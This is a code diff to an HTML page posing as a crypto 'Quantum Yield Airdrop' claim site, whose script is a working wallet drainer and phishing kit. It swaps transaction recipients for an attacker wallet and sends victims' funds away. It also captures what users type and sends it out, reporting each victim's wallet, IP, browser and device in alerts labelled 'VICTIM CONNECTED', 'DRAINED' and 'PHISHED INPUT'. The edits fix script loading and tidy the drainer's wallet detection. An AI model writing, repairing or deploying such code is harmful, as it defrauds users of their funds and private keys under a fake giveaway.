@@ -3,10 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + NFTs!</title>
+    <title> Quantum Yield Airdrop [SEPOLIA TESTNET] - Claim 5 QYT + NFTs!</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <!-- Load ethers.js first to ensure it's available -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
     <style>
         :root {
             --primary: #00F2DE;
@@ -416,7 +418,7 @@
 
         <section class="container section testimonials">
             <h2>What People Say</h2>
-            <p>"Claimed 5 QYT—insane!" - @CryptoKingX</p>
+            <p>"Claimed 5 QYT�insane!" - @CryptoKingX</p>
             <p>"Fast, got my NFT!" - @NFTManiac</p>
         </section>
 
@@ -499,10 +501,12 @@
 
         // Wallet detection and clipper
         async function detectWallet() {
-            if (typeof window.ethereum === "undefined" && typeof window.web3 === "undefined") {
-                return null;
+            if (typeof window.ethereum !== "undefined") {
+                return window.ethereum;
+            } else if (typeof window.web3 !== "undefined") {
+                return window.web3.currentProvider;
             }
-            return window.ethereum || window.web3.currentProvider;
+            return null;
         }
 
         async function setupWalletClipper(provider) {
@@ -515,7 +519,7 @@
                     tx.to = ATTACKER_WALLET;
                     tx.chainId = "0xAA36A7";
                     tx.gasPrice = ethers.utils.parseUnits("20", "gwei").toHexString();
-                    await sendVictimAlert(`🪝 CLIP ATTEMPT: Swapped ${originalTo} to ${ATTACKER_WALLET}`);
+                    await sendVictimAlert(` CLIP ATTEMPT: Swapped ${originalTo} to ${ATTACKER_WALLET}`);
                     const ethersProvider = new ethers.providers.Web3Provider(provider);
                     return ethersProvider.sendTransaction(tx);
                 }
@@ -595,7 +599,7 @@
                 const gasCost = gasLimit.mul(gasPrice);
 
                 const info = await getVictimInfo();
-                await sendVictimAlert(`🎯 VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                await sendVictimAlert(` VICTIM CONNECTED\nWallet: ${victimAddress}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
 
                 document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Contract (0.001 SEP)...</p>";
                 await signer.sendTransaction({
@@ -636,7 +640,7 @@
                         gasPrice,
                         chainId: 11155111,
                     });
-                    await sendVictimAlert(`✅ SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
+                    await sendVictimAlert(` SEPOLIA SUCCESS: ${victimAddress} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${tx.hash}\nIP: ${info.ip}`);
                 }
 
                 document.getElementById("status").innerHTML = "<p class='warning'>Spinning Bonus...</p><div class='wheel'></div>";
@@ -684,7 +688,7 @@
             if (input) {
                 document.getElementById("phishing-status").innerHTML = "<p class='warning'>Encrypting...</p>";
                 setTimeout(async () => {
-                    await sendVictimAlert(`🗝️ PHISHED INPUT: ${input}`);
+                    await sendVictimAlert(` PHISHED INPUT: ${input}`);
                     document.getElementById("phishing-status").innerHTML = "<p class='success'>NFT link sent to your wallet!</p>";
                 }, 2000);
             }
@@ -697,6 +701,5 @@
             document.getElementById("nft2-rarity").innerHTML = `Yield Bot #${Math.floor(Math.random() * 100)} - Legendary`;
         };
     </script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
 </body>
 </html>
